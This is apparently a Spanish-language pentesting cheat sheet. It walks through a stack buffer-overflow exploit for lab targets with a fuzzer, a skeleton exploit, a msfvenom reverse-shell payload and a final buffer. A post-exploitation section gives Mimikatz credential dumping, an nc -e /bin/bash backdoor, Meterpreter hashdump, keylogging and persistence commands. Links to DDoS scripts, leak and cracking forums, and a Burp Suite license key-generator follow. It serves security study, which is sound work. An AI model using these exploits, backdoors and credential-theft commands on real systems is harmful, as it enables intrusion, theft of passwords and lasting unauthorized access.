Apuntes traducidos de [https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

- [Explotando un Buffer Overflow de 64 bits](https://bytesoverbombs.io/exploiting-a-64-bit-buffer-overflow-469e8b500f10)
- [Saltando al Shellcode](https://www.abatchy.com/2017/05/jumping-to-shellcode.html)
- [Explicación de Buffer Overflow](http://www.voidcn.com/article/p-ulyzzbfx-z.html)
- [Desarrollo de Exploits en Windows - Parte 4: Localización de Saltos al Shellcode](https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/)
- [Una Visión Práctica de Buffer Overflow Basado en la Pila](https://medium.com/@johntroony/a-practical-overview-of-stack-based-buffer-overflow-7572eaaa4982)

## Immunity Debugger

**Siempre ejecuta Immunity Debugger como Administrador si es posible.**

Generalmente, hay dos formas de usar Immunity Debugger para depurar una aplicación:

1. Asegúrate de que la aplicación esté en ejecución, abre Immunity Debugger y luego usa `Archivo -> Adjuntar` para conectar el depurador al proceso en ejecución.
2. Abre Immunity Debugger y luego usa `Archivo -> Abrir` para ejecutar la aplicación.

Cuando adjuntas una aplicación o abres una aplicación en Immunity Debugger, la aplicación se pausará. Haz clic en el botón "Ejecutar" o presiona F9.

Nota: Si el binario que estás depurando es un servicio de Windows, es posible que necesites reiniciar la aplicación mediante `sc`.

```
sc stop SLmail
sc start SLmail
```

Algunas aplicaciones están configuradas para iniciarse desde el administrador de servicios y no funcionarán a menos que se inicien desde el control de servicios.

## Configuración de Mona

Mona es un potente complemento para Immunity Debugger que facilita mucho la explotación de buffer overflows. Descarga: [mona.py](https://www.notion.so/_static/files/mona.py)

- La última versión se puede descargar aquí: [https://github.com/corelan/mona](https://github.com/corelan/mona)
- El manual se encuentra aquí: [https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)

Copia el archivo [mona.py](http://mona.py/) en el directorio PyCommands de Immunity Debugger (generalmente ubicado en C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands).

En Immunity Debugger, escribe lo siguiente para configurar un directorio de trabajo para mona.

```
!mona config -set workingfolder c:\\mona\\%p
```

## Analisis de modulos con mona

El propósito principal de `!mona modules` es generar una lista de módulos DLL cargados en el espacio de memoria de un proceso en particular. Esto es útil para los investigadores de seguridad y los desarrolladores de exploits que están analizando una aplicación para encontrar vulnerabilidades y desarrollar exploits. Cuando se está realizando una investigación de seguridad, es común buscar vulnerabilidades de desbordamiento de búfer u otras debilidades de seguridad en una aplicación. `!mona modules` ayuda a identificar las bibliotecas de enlace dinámico (DLL) cargadas en el proceso objetivo, lo que puede ser útil para encontrar funciones o instrucciones específicas que pueden ser objeto de ataques.

```bash
!mona modules
```

```bash
---------- Mona command started on 2023-10-08 23:15:09 (v2.0, rev 634) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Module info :
0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    0x75920000 | 0x75926000 | 0x00006000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\syswow64\NSI.dll) 0x540
0BADF00D    0x76d30000 | 0x76d76000 | 0x00046000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\syswow64\KERNELBASE.dll) 0x140
0BADF00D    0x77480000 | 0x774b5000 | 0x00035000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 [WS2_32.DLL] (C:\Windows\syswow64\WS2_32.DLL) 0x140
0BADF00D    0x770f0000 | 0x77200000 | 0x00110000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\syswow64\kernel32.dll) 0x140
0BADF00D    0x75930000 | 0x759dc000 | 0x000ac000 | True   | True    | True  | False |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\syswow64\msvcrt.dll) 0x140
0BADF00D    0x75710000 | 0x7571c000 | 0x0000c000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\syswow64\CRYPTBASE.dll) 0x540
0BADF00D    0x75720000 | 0x75780000 | 0x00060000 | True   | True    | True  | False |  True    | True   | 6.1.7601.17514 [SspiCli.dll] (C:\Windows\syswow64\SspiCli.dll) 0x140
0BADF00D    0x77bc0000 | 0x77d40000 | 0x00180000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SysWOW64\ntdll.dll) 0x140
0BADF00D    0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False | False |  False   | False  | -1.0- [brainpan.exe] (C:\bof\brainpan\brainpan.exe) 0x0
0BADF00D    0x76a40000 | 0x76b30000 | 0x000f0000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\syswow64\RPCRT4.dll) 0x140
0BADF00D    0x76a20000 | 0x76a39000 | 0x00019000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SysWOW64\sechost.dll) 0x140
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D
0BADF00D   [+] Preparing output file 'modules.txt'
0BADF00D       - (Re)setting logfile c:\\mona\\brainpan\modules.txt
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.083000
```

**Detalles de los módulos:**

Para cada módulo, se proporciona la siguiente información:

- **Base:** La dirección base del módulo en memoria.
- **Top:** La dirección superior del módulo en memoria.
- **Size:** El tamaño del módulo en memoria.
- **Rebase:** Indica si el módulo es susceptible de ser "rebaseado" o si la dirección base es fija.
- **SafeSEH:** Indica si el módulo tiene la característica de SafeSEH habilitada para la protección contra desbordamientos de pila.
- **ASLR:** Indica si el módulo tiene la característica de ASLR (Address Space Layout Randomization) habilitada.
- **CFG:** Control Flow Guard.
- **NXCompat:** Indica si el módulo tiene la característica NX (No-eXecute) habilitada para prevenir ejecución de código en regiones de memoria marcadas como datos.
- **OS Dll:** Indica si el módulo es una DLL (Dynamic Link Library) del sistema operativo.
- **Version, Modulename & Path, DLLCharacteristics:** Información adicional que incluye la versión del módulo, el nombre del módulo, la ruta del archivo y las características de la DLL.

Si el fichero de resultados es muy extenso, se puede filtrar con:

```bash
!mona nosafeseh 
```

El comando `!mona nosafeseh` esté diseñado para filtrar y mostrar solo los módulos que no tienen la característica de SafeSEH habilitada. Esto puede ser útil para centrarse específicamente en los módulos que pueden ser más propensos a explotaciones exitosas de desbordamiento de búfer en la gestión de excepciones estructuradas (SEH).

### Fuzzing

El siguiente script de Python se puede modificar y usar para fuzzear puntos de entrada remotos de una aplicación. Enviará cadenas de búfer cada vez más largas con la esperanza de que una de ellas finalmente haga que la aplicación se bloquee.

```python
import socket, time, sys

ip = "10.0.0.1"
port = 21
timeout = 5

# Crea un conjunto de cadenas de búfer de longitud creciente.
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        s.send("USER username\\r\\n")
        s.recv(1024)

        print("Fuzzing EXITO con %s bytes" % len(string))
        s.send("PASS " + string + "\\r\\n")
        s.recv(1024)
        s.send("QUIT\\r\\n")
        s.recv(1024)
        s.close()
    except:
        print("No se pudo conectar a " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)

```

Asegúrate de que el registro EIP haya sido sobrescrito por A (\\x41). Toma nota de cualquier otro registro que haya sido sobrescrito o que esté apuntando a un espacio en memoria que ha sido sobrescrito.

## Replicación del Bloqueo y Control de EIP

El siguiente código de exploit esqueleto se puede usar para el resto de la explotación de buffer overflow:

```python
import socket

ip = "10.0.0.1"
port = 21

prefijo = ""
offset = 0
desbordamiento = "A" * offset
retn = ""
relleno = ""
carga = ""
postfijo = ""

búfer = prefijo + desbordamiento + retn + relleno + carga + postfijo

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Enviando búfer malicioso...")
    s.send(búfer + "\\r\\n")
    print("¡Listo!")
except:
    print("No se pudo conectar.")

```

Usando la longitud del búfer que causó el bloqueo, genera un búfer único para determinar el desplazamiento en el patrón que sobrescribe el registro EIP y el desplazamiento en el patrón al que apuntan otros registros. Crea un patrón que sea 400 bytes más largo que el búfer que bloqueó la aplicación para determinar si nuestro shellcode puede encajar de inmediato. Si el búfer más grande no bloquea la aplicación, usa un patrón igual a la longitud del búfer que bloqueó la aplicación y agrega lentamente más al búfer para encontrar espacio.

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

```

Mientras el búfer único esté en la pila, usa el comando findmsp de mona, con el argumento de distancia configurado en la longitud del patrón.

```
!mona findmsp -distance 600
...
[+] Buscando un patrón cíclico en la memoria
Patrón cíclico (normal) encontrado en 0x005f3614 (longitud 600 bytes)
Patrón cíclico (normal) encontrado en 0x005f4a40 (longitud 600 bytes)
Patrón cíclico (normal) encontrado en 0x017df764 (longitud 600 bytes)
EIP contiene un patrón normal: 0x78413778 (desplazamiento 112)
ESP (0x017dfa30) apunta al desplazamiento 116 en el patrón normal (longitud 484)
EAX (0x017df764) apunta al desplazamiento 0 en el patrón normal (longitud 600)
EBP contiene un patrón normal: 0x41367841 (desplazamiento 108)
...

```

Toma nota del desplazamiento de EIP (112) y de cualquier otro registro que apunte al patrón, tomando nota de sus desplazamientos también. Parece que el registro ESP apunta a los últimos 484 bytes del patrón, que es suficiente espacio para nuestro shellcode.

Crea un nuevo búfer utilizando esta información para asegurarte de que puedas controlar EIP:

```
prefijo = ""
offset = 112
desbordamiento = "A" * offset
retn = "BBBB"
relleno = ""
carga = "C" * (600-112-4)
postfijo = ""

búfer = prefijo + desbordamiento + retn + relleno + carga + postfijo

```

Bloquea la aplicación usando este búfer y asegúrate de que EIP esté sobrescrito por B (\\x42) y que el registro ESP apunte al comienzo de los C (\\x43).

## Encontrar Caracteres Incorrectos

Genera un bytearray utilizando mona y excluye el byte nulo (\\x00) de forma predeterminada. Toma nota de la ubicación del archivo bytearray.bin que se genera.

```
!mona bytearray -b "\\x00"

```

Ahora genera una cadena de caracteres incorrectos que sea idéntica al bytearray. El siguiente script de Python se puede utilizar para generar una cadena de caracteres incorrectos desde \\x01 hasta \\xff:

```python
for x in range(1, 256):
    print("\\\\x" + "{:02x}".format(x), end='')

print()

```

Coloca la cadena de caracteres incorrectos antes de los C en tu búfer y ajusta la cantidad de C para compensar:

```
caracteres_incorrectos = "\\x01\\x02\\x03\\x04\\x05...\\xfb\\xfc\\xfd\\xfe\\xff"
carga = caracteres_incorrectos + "C" * (600-112-4-255)
```

Bloquea la aplicación usando este búfer y toma nota de la dirección a la que apunta ESP. Esto puede cambiar cada vez que bloquees la aplicación, así que acostúmbrate a copiarlo del registro cada vez.

Utiliza el comando mona compare para hacer referencia al bytearray que generaste y a la dirección a la que apunta ESP:

```
!mona compare -f C:\\mona\\appname\\bytearray.bin -a <dirección>
```

## Encontrar un Punto de Salto

El comando mona jmp se puede usar para buscar instrucciones jmp (o equivalentes) a un registro específico. El comando jmp, por defecto, ignorará cualquier módulo marcado como aslr o rebase.

El siguiente ejemplo busca "jmp esp" o equivalente (por ejemplo, call esp, push esp; retn, etc.) asegurándose de que la dirección de la instrucción no contenga los caracteres incorrectos \\x00, \\x0a y \\x0d.

```
!mona jmp -r esp -cpb "\\x00\\x0a\\x0d"
```

El comando mona find también se puede utilizar para encontrar instrucciones específicas, aunque en su mayor parte, el comando jmp es suficiente:

```
!mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\\x00\\x0a\\x0d"
```

Es necesario convertir la dirección de memoria a little endian para poder utilizarla en el exploit.

```bash
python -c "import struct; print(struct.pack('<I', 0x311712F3))"
```

## Generar Payload

Genera un payload de shell inverso usando msfvenom, asegurándote de excluir los mismos caracteres incorrectos que se encontraron anteriormente:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\\x00\\x0a\\x0d" -f c
```

## Agregar NOPs

Si se utilizó un codificador (lo más probable si hay caracteres incorrectos), recuerda agregar al menos 16 NOPs (\\x90) al payload.

## Búfer Final

```
prefijo = ""
offset = 112
desbordamiento = "A" * offset
retn = "\\x56\\x23\\x43\\x9A"
relleno = "\\x90" * 16
carga = "\\xdb\\xde\\xba\\x69\\xd7\\xe9\\xa8\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1..."
postfijo = ""

búfer = prefijo + desbordamiento + retn + relleno + carga + postfijo

```

## Práctica de Buffer Overflow

- [dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
- [vulnserver](https://github.com/stephenbradshaw/vulnserver)
- [Práctica de Stack Buffer Overflow PWK/OSCP](https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/)

```

Estos recursos y notas son valiosos para cualquier persona interesada en comprender y practicar ataques de desbordamiento de búfer en el campo de la ciberseguridad. Asegúrate de mantener tus conocimientos actualizados, ya que el campo de la ciberseguridad está en constante evolución y pueden surgir nuevas técnicas y herramientas con el tiempo.

Si tienes alguna pregunta específica o necesitas aclaraciones sobre alguno de los temas mencionados en tus notas, no dudes en preguntar, estaré encantado de ayudarte.
```

# Fase de Post-explotación

## Descarga de archivos

Para descargar archivos de una máquina, se puede utilizar el comando `scp`. Este comando copia archivos de una máquina a otra.

```bash
scp <USERNAME>@<IP>:<PATH_TO_FILE> <PATH_TO_SAVE>
```

## Elevación de privilegios

### Elevación de privilegios mediante Mimikatz

Para obtener las credenciales de los usuarios de una máquina mediante Mimikatz, se puede utilizar el comando `mimikatz.exe privilege::debug sekurlsa::logonpasswords`.

```bash
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```

### Elevación de privilegios mediante Empire

Para obtener la información de una máquina mediante Empire, se puede utilizar la herramienta `empire`. Esta herramienta busca información de la máquina y la enumera.

```bash
empire
```

Para utilizar Empire en la fase de post-explotación, se pueden seguir estos pasos:

1. Iniciar Empire con el comando `empire`.
2. Crear un listener para recibir las conexiones de la máquina comprometida con el comando `listeners`.
3. Crear un módulo para la máquina comprometida con el comando `usemodule`.
4. Configurar el módulo con las opciones necesarias con el comando `set`.
5. Ejecutar el módulo con el comando `execute`.
6. Obtener la información recolectada por Empire con el comando `get`.

Por ejemplo, para obtener información del sistema de la máquina comprometida, se puede utilizar el módulo `system_info`. Los comandos serían los siguientes:

```bash
usemodule situational_awareness/system_info
set Listener http
execute
get
```

Esto ejecutará el módulo `system_info`, que obtendrá información del sistema de la máquina comprometida y la enviará al listener configurado.

## Mantenimiento del acceso

### Mantenimiento del acceso mediante Netcat

Para mantener el acceso a una máquina mediante Netcat, se puede utilizar el comando `nc -lvp <PUERTO> -e /bin/bash`. Este comando abre un puerto y permite ejecutar comandos en la máquina.

```bash
nc -lvp <PUERTO> -e /bin/bash
```

### Mantenimiento del acceso mediante Meterpreter

Para mantener el acceso a una máquina mediante Meterpreter, se puede utilizar la herramienta `msfconsole`. Esta herramienta permite interactuar con la máquina y ejecutar comandos.

```bash
msfconsole
```

Para mantener el acceso a una máquina mediante Meterpreter, se puede utilizar la herramienta `msfconsole`. Esta herramienta permite interactuar con la máquina y ejecutar comandos. Para establecer una sesión Meterpreter, primero se necesita una sesión de shell de una máquina comprometida por Metasploit. A continuación, se debe ejecutar el comando `sessions -i <SESSION_NUMBER>` para abrir la sesión de shell, y luego ejecutar el comando `use post/multi/manage/shell_to_meterpreter` para convertir la sesión de shell en una sesión Meterpreter.

Una vez que se establece una sesión Meterpreter, se puede ejecutar el comando `help` para obtener una lista de comandos disponibles. Algunos comandos útiles incluyen:

- `getsystem`: intenta obtener los máximos privilegios en la máquina
- `hashdump`: extrae las contraseñas almacenadas en la máquina
- `keyscan_start`: comienza a registrar las pulsaciones de teclas en la máquina
- `screenshare`: muestra la pantalla de la máquina en tiempo real
- `download`: descarga un archivo de la máquina
- `upload`: carga un archivo en la máquina

Para mantener el acceso a la máquina, se pueden utilizar los comandos `run persistence -U -i 5 -p 443 -r <IP>` para crear un backdoor que se ejecute automáticamente al iniciar sesión en la máquina, y `run autoroute -s <SUBNET>` para agregar una ruta automática a través de la máquina a la red objetivo.

## Recursos

[https://github.com/capture0x/LFI-FINDER](https://github.com/capture0x/LFI-FINDER)

[ethicalhackingplayground/pathbuster: A path-normalization pentesting tool.](https://www.notion.so/ethicalhackingplayground-pathbuster-A-path-normalization-pentesting-tool-c99d1264800b4038a1174104679b45e9?pvs=21)

[BlackArch Linux](https://www.notion.so/BlackArch-Linux-bdb2b61a503a4df9ab30937dcfc7fcb8?pvs=21)

[gh0stzk/dotfiles: bspwm + polybar + eww rices. 12 themes with a rice selector to change on the fly.](https://www.notion.so/gh0stzk-dotfiles-bspwm-polybar-eww-rices-12-themes-with-a-rice-selector-to-change-on-the-fly-18e2067e12954640b2a34c3a7de5a919?pvs=21)

[H1R0GH057/Anonymous DDoS scripts](https://www.notion.so/H1R0GH057-Anonymous-DDoS-scripts-a8c4fff64c1746d8ad163e0254901efe?pvs=21)

[malwaredllc/byob: An open-source post-exploitation framework for students, researchers and developers.](https://www.notion.so/malwaredllc-byob-An-open-source-post-exploitation-framework-for-students-researchers-and-developer-7bcb055f1d664b2096e3b2aeeef2c7e8?pvs=21)

[Ignitetechnologies (Hacking Articles )](https://www.notion.so/Ignitetechnologies-Hacking-Articles-a10e035cd10243c091f9cef397fd8b22?pvs=21)

[Ignitetechnologies/TryHackMe-CTF-Writeups](https://www.notion.so/Ignitetechnologies-TryHackMe-CTF-Writeups-5280cd127b6c475e857c5a512870da49?pvs=21)

[Ignitetechnologies/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://www.notion.so/Ignitetechnologies-PayloadsAllTheThings-A-list-of-useful-payloads-and-bypass-for-Web-Application-Se-03741c6516c0424ea6fd6960bdd171f6?pvs=21)

[The Hitchhiker’s Guide to Online Anonymity | The Hitchhiker’s Guide to Online Anonymity](https://www.notion.so/The-Hitchhiker-s-Guide-to-Online-Anonymity-The-Hitchhiker-s-Guide-to-Online-Anonymity-ce339a3bc2854e239607faf11442e544?pvs=21)

[From Gmail to Phone Number & Social Media | by Mario | Apr, 2023 | OSINT TEAM](https://www.notion.so/From-Gmail-to-Phone-Number-Social-Media-by-Mario-Apr-2023-OSINT-TEAM-350c1ad962a745d894930c5f120217aa?pvs=21)

[OSINT: How to find information on anyone | by Petro Cherkasets | OSINT TEAM](https://www.notion.so/OSINT-How-to-find-information-on-anyone-by-Petro-Cherkasets-OSINT-TEAM-fc95432dad5c46fea6f2a950ddac89c4?pvs=21)

[PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings](https://www.notion.so/PayloadsAllTheThings-Reverse-Shell-Cheatsheet-md-at-master-swisskyrepo-PayloadsAllTheThings-ecaafbcec1cc495b8086f7892458249b?pvs=21)

[Academia Hacker INCIBE | INCIBE](https://www.notion.so/Academia-Hacker-INCIBE-INCIBE-d5051d31d9e84ace860f17dd1f2dd9e7?pvs=21)

[Car Hacking Part 1: Intro](https://www.notion.so/Car-Hacking-Part-1-Intro-3a3b0b4d9d934f2f856381939ba2ff4b?pvs=21)

[Car Hacking Part 2: Replay Attack](https://www.notion.so/Car-Hacking-Part-2-Replay-Attack-9cd78b922d7a4a83a9df06c42697478d?pvs=21)

[Car Hacking Part 3: Rolljam Attack](https://www.notion.so/Car-Hacking-Part-3-Rolljam-Attack-14388c9671e24bc197c9be52eb497dd0?pvs=21)

[Cross-Site Scripting (XSS) Cheat Sheet - 2023 Edition | Web Security Academy](https://www.notion.so/Cross-Site-Scripting-XSS-Cheat-Sheet-2023-Edition-Web-Security-Academy-b7a91fe852d742bcb4612254bdc88cd2?pvs=21)

[ygorsimoes/heimdall: ⚡️ Heimdall is an open source tool designed to automate fetching from a target site's admin panel using brute force in the wordlist. ⚡️](https://www.notion.so/ygorsimoes-heimdall-Heimdall-is-an-open-source-tool-designed-to-automate-fetching-from-a-target--0c9af09acd474eac8c9da7cefbc8fb94?pvs=21)

[NoorQureshi/kali-linux-cheatsheet: Kali Linux Cheat Sheet for Penetration Testers](https://www.notion.so/NoorQureshi-kali-linux-cheatsheet-Kali-Linux-Cheat-Sheet-for-Penetration-Testers-67f9fb9059f34c8b9e1d6b9c262c6864?pvs=21)

![20230423_092132.jpg](Hacking%20CheatSheet%20b16f2e1230624ec0b0cb325a92426449/20230423_092132.jpg)

[Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512, Wordpress, Bcrypt hashes for free online](https://www.notion.so/Decrypt-MD5-SHA1-MySQL-NTLM-SHA256-SHA512-Wordpress-Bcrypt-hashes-for-free-online-b599b1a1e601438b9360d2166769d80d?pvs=21)

[ivan-sincek/penetration-testing-cheat-sheet: Work in progress...](https://www.notion.so/ivan-sincek-penetration-testing-cheat-sheet-Work-in-progress-192a42d40a12424db40e4922e4ca00e1?pvs=21)

[six2dez/reconftw: reconFTW is a tool designed to perform automated recon on a target domain by running the best set of tools to perform scanning and finding out vulnerabilities](https://www.notion.so/six2dez-reconftw-reconFTW-is-a-tool-designed-to-perform-automated-recon-on-a-target-domain-by-runni-25f63d465cf34f7c974b74f84bc63906?pvs=21)

[LeakIX/wpfinger: wpfinger is a red-team WordPress scanning tool](https://www.notion.so/LeakIX-wpfinger-wpfinger-is-a-red-team-WordPress-scanning-tool-ccbd1de3a32146b18c5fe3c5239f3a53?pvs=21)

[CorrieOnly/google-dorks](https://www.notion.so/CorrieOnly-google-dorks-f26366a869a644b792a8c528bfc2d02c?pvs=21)

[payloadbox/sql-injection-payload-list: 🎯 SQL Injection Payload List](https://www.notion.so/payloadbox-sql-injection-payload-list-SQL-Injection-Payload-List-267651cda03f4fc88597c8f442c21dcc?pvs=21)

[SNGWN/Burp-Suite: || Activate Burp Suite Pro with Key-Generator and Key-Loader ||](https://www.notion.so/SNGWN-Burp-Suite-Activate-Burp-Suite-Pro-with-Key-Generator-and-Key-Loader-73547a0da4fb4ca1b20c28b89317dfe3?pvs=21)

[RsaCtfTool/RsaCtfTool: RSA attack tool (mainly for ctf) - retreive private key from weak public key and/or uncipher data](https://www.notion.so/RsaCtfTool-RsaCtfTool-RSA-attack-tool-mainly-for-ctf-retreive-private-key-from-weak-public-key--01eb966742cf47b6937b9be73a7de5a9?pvs=21)

[ius/rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters](https://www.notion.so/ius-rsatool-rsatool-can-be-used-to-calculate-RSA-and-RSA-CRT-parameters-1263d7a7e74345a2b7053c7a721f91e2?pvs=21)

[Home | Metasploit Documentation Penetration Testing Software, Pen Testing Security](https://www.notion.so/Home-Metasploit-Documentation-Penetration-Testing-Software-Pen-Testing-Security-d713543a8d304031a035f70b177662de?pvs=21)

[GitHub - botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study: Burp Suite Certified Practitioner Exam Study](https://www.notion.so/GitHub-botesjuan-Burp-Suite-Certified-Practitioner-Exam-Study-Burp-Suite-Certified-Practitioner-E-34fa8491126e4d499142c97752b9a518?pvs=21)

[GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://www.notion.so/GitHub-swisskyrepo-PayloadsAllTheThings-A-list-of-useful-payloads-and-bypass-for-Web-Application--6d3b9f6142864c21bd623c9f73277b36?pvs=21)

[GitHub - botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study: Burp Suite Certified Practitioner Exam Study](https://www.notion.so/GitHub-botesjuan-Burp-Suite-Certified-Practitioner-Exam-Study-Burp-Suite-Certified-Practitioner-E-98b3ae3cc3a24a919f27f732c30f5b13?pvs=21)

[GitHub - Elliott-Fibonacci/ghost-tunnel](https://www.notion.so/GitHub-Elliott-Fibonacci-ghost-tunnel-459c84dff44048889ff8961041269593?pvs=21)

[luijait/Minishare-1.4.1BoF_Exploit: Exploit para MiniShare1.4.1](https://www.notion.so/luijait-Minishare-1-4-1BoF_Exploit-Exploit-para-MiniShare1-4-1-2c6b765afd434af0bf1033fc51d8ce5d?pvs=21)

[SQL Injection Cheat Sheet | Invicti](https://www.notion.so/SQL-Injection-Cheat-Sheet-Invicti-6b0ce7a6b584422bbe1e37b139c5668b?pvs=21)

[SQL injection cheat sheet | Web Security Academy](https://www.notion.so/SQL-injection-cheat-sheet-Web-Security-Academy-887c97a721a144f99db812ce0c1a2f44?pvs=21)

[Cross-Site Scripting (XSS) Cheat Sheet - 2023 Edition | Web Security Academy](https://www.notion.so/Cross-Site-Scripting-XSS-Cheat-Sheet-2023-Edition-Web-Security-Academy-2c0b8a4e931343d98210214e39cb7af1?pvs=21)

[Vulnerability & Exploit Database - Rapid7](https://www.notion.so/Vulnerability-Exploit-Database-Rapid7-bcb2d0b2fc90420d9a99d084bd312bfb?pvs=21)

[Cracking Forums](https://www.notion.so/Cracking-Forums-23bfdf0e066345fa82ba3e4de82bd54b?pvs=21)

[Z-lib](https://www.notion.so/Z-lib-469d4643365b4c19b714b169f7b8d2e0?pvs=21)

[LeakBase - Official Community Forum](https://www.notion.so/LeakBase-Official-Community-Forum-78a340f0269747cc9d43c8c746b66f19?pvs=21)

[XSS.is (ex DaMaGeLaB)](https://www.notion.so/XSS-is-ex-DaMaGeLaB-3cd3b92f68784e0fbff12d39f06788b3?pvs=21)

[Nulled forum](https://www.notion.so/Nulled-forum-b7dafab9db5f4d058e5b853badc4d594?pvs=21)

[Linux Kernel CVEs | All CVEs](https://www.notion.so/Linux-Kernel-CVEs-All-CVEs-1eeecbeb7f224b65ac23e43deac3a76a?pvs=21)

[Brum3ns/encode: Script to read input from stdin and encode it](https://www.notion.so/Brum3ns-encode-Script-to-read-input-from-stdin-and-encode-it-f68df00b32ab409c9f34ba23d28adf32?pvs=21)

[fuzzdb-project/fuzzdb: Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery.](https://www.notion.so/fuzzdb-project-fuzzdb-Dictionary-of-attack-patterns-and-primitives-for-black-box-application-fault--2cfa647638004c3db4374fbceac0b545?pvs=21)

[carlospolop/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://www.notion.so/carlospolop-PEASS-ng-PEASS-Privilege-Escalation-Awesome-Scripts-SUITE-with-colors-5c759c66ab9f46f090a1256504dc5a96?pvs=21)

[Windows Registry Cheatsheet](https://www.notion.so/Windows-Registry-Cheatsheet-6c179e2ecd50461882b3893dbcf3cfbd?pvs=21)

[dolevf/Black-Hat-Bash: The Black Hat Bash book repository](https://www.notion.so/dolevf-Black-Hat-Bash-The-Black-Hat-Bash-book-repository-7a3c681a7dbf4679a36573bc4397f64b?pvs=21)

[frizb/Hydra-Cheatsheet: Hydra Password Cracking Cheetsheet](https://www.notion.so/frizb-Hydra-Cheatsheet-Hydra-Password-Cracking-Cheetsheet-c7599bcb034543b7bd54c5e0d822e23c?pvs=21)

| Operador | Función |
| --- | --- |
| ~ | Apunta al directorio home del usuario actual |
| $() | Apunta a una variable del SO |
| | | Redirige la salida del comando anterior al siguiente |
| & | Ejecuta ambos comandos independientemente del resultado |
| && | Ejecuta el segundo comando solo si el primero tiene éxito (retorno de cero) |
